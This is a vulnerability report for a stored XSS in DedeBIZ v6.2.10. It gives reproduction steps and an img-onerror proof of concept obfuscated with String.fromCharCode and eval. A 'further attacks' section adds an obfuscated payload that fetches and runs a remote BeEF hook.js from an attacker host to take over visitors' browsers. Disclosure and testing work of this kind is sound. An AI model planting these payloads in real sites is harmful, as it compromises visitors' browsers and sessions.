# DedeBIZ v6.2.10 XSS injection

XSS injection vulnerability exists in dedebiz v6.2.10，it can cause CSRF and other serious attacks.

offcial website: https://www.dedebiz.com/

version:v6.2.10

type：Stored XSS



### Testing

1.Install and set up the website

2.Login background management interface `/admin`，go to System Settings --> Member Settings --> Enable member function

![image-20230726133838369](https://s2.loli.net/2023/07/26/RzIlDNgAqir9eCZ.png)

3.Common functions --> Website column management --> Add column

For example, add a column named "xss_test" here

![image-20230726134444718](https://s2.loli.net/2023/07/26/jGzK9UmNcEBs6Yt.png)

4.Log in to the homepage of the website and register as a member. At this time, members need email verification

For convenience, using the administrator account to fill in the user mailbox and make the user 'abc123' a normal user

![image-20230726134828151](https://s2.loli.net/2023/07/26/OjDeWKX8iJZLtMx.png)

![image-20230726134919228](https://s2.loli.net/2023/07/26/QfFOBaZwNUuX1yG.png)

5.Log in to user abc123, enter document management, and publish an article

![image-20230726135207297](https://s2.loli.net/2023/07/26/klSO6H8LdREitj2.png)



6.First publish an article containing normal information, indicating that the publication was successful,

and then modify the article

notice the point:`/user/article_edit.php?channelid=1&aid=3`

Click here to put the edit box into source mode

![image-20230726140446653](https://s2.loli.net/2023/07/26/EZKHz5bUo4PsAWd.png)

After testing, the system will filter elements such as script, style, and so on. Here, the oneeror attribute of the img tag is used to attack successfully

POC：

You can use `eval()` to execute js code, or you can rewrite the page to write js code directly using `document.write()`

```html
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))">
```

![image-20230726141035301](https://s2.loli.net/2023/07/26/o7edu5iqDhcRNGU.png)

7.At this time, the article is in the state to be reviewed, enter the administrator background, preview the article, you can still find that the malicious code is executed

If the article is approved, then other users or visitors visit the article, and the malicious code inside the article is automatically executed

![image-20230726141238351](https://s2.loli.net/2023/07/26/9vQlbETydU1mjWf.png)



### Further attacks

With the BeEF tool, the harm is further amplified

Construct POC to import remote js:

```js
fetch('http://xx.xx.xx.xx:3000/hook.js').then(response => response.text()).then(text => eval(text))

<img src="x" onerror="eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,120,120,46,120,120,46,120,120,46,120,120,58,51,48,48,48,47,104,111,111,107,46,106,115,39,41,46,116,104,101,110,40,114,101,115,112,111,110,115,101,32,61,62,32,114,101,115,112,111,110,115,101,46,116,101,120,116,40,41,41,46,116,104,101,110,40,116,101,120,116,32,61,62,32,101,118,97,108,40,116,101,120,116,41,41))">
```

According to the previous description, modify and browse the article, you can see that in the beef administration page, a host browser has been online

![image-20230726142449891](https://s2.loli.net/2023/07/26/WmgNKiMSaBJT7IZ.png)

The modules that come with beef can be used to perform a more damaging attack

(Some may be outdated or obsolete)

![image-20230726143115460](https://s2.loli.net/2023/07/26/5mrR4YsUwvhHN2T.png)
